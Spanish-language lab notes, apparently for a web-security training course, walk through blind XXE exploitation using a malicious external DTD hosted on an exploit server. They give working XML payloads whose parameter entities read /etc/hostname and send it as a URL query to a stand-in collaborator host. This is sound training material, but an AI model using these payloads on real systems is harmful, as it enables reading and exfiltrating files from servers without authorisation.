En esta clase continuamos explorando técnicas avanzadas de explotación XXE ciega, esta vez utilizando una DTD externa maliciosa para exfiltrar el contenido del archivo /etc/hostname. Como la aplicación no muestra la respuesta del servidor, debemos forzar que este realice una petición externa que contenga los datos deseados.

Preparamos un archivo DTD en nuestro exploit server que define una entidad para leer el archivo local y otra para enviar su contenido mediante una petición HTTP a Burp Collaborator. Luego referenciamos esta DTD desde la carga XML enviada al stock checker.

Al realizar la petición y observar actividad en Collaborator, incluyendo potencialmente el contenido del archivo, conseguimos demostrar y aprovechar la vulnerabilidad, incluso en un escenario completamente ciego. Esta técnica es especialmente útil cuando no hay ningún tipo de respuesta visible en la interfaz.

En esta clase continuamos con el mismo laboratorio anterior, centrado en la explotación de una vulnerabilidad XXE ciega mediante una DTD externa maliciosa. Ya tenemos definido y alojado el archivo DTD en nuestro exploit server, y ahora utilizamos este recurso para finalizar la exfiltración del contenido del archivo /etc/hostname.

Repasamos cómo se estructura correctamente la carga XML que referencia esa DTD, y analizamos los resultados obtenidos en Burp Collaborator para verificar que la petición externa con los datos del archivo fue realizada correctamente. Este enfoque consolida el uso de entidades parametrizadas en DTD externas como una técnica poderosa para filtrar información sensible en entornos sin salida directa.

------


1. Primero probar en los campos de XML si reflejan el valor que añadimos
2. Crear un entidad externa
3. Crear una entidad interna en el parametro

Creamos una peticion con un XXE en parametro,  para enviarlo al collaborator:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://burpsuite-collaborator/" > %xxe;]>
<productId>
1
</productId>
```

Ahora para extraer datos, como ya vimos que podemos hacer peticiones a mi collaborator, ahora cambiamos el recurso con el del Exploit Server

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-server/" > %xxe;]>
<productId>
1
</productId>
```

Y desde el Log del server, vemos que nos realiza una peticion al exploit-server

Para ello enviaremos una DTD externa maliciosa

#### Exploit Server:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'https://colaborator.com/?content=%file;'>">

//Comentario: Debemos de representar el "%" de la entidad, como &#x25;
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://colaborator.com/?content=%file;'>">
%eval;
%exfil;
```

Y con esto, nos llega un solicitud a nuestro collaborator con el comando hostname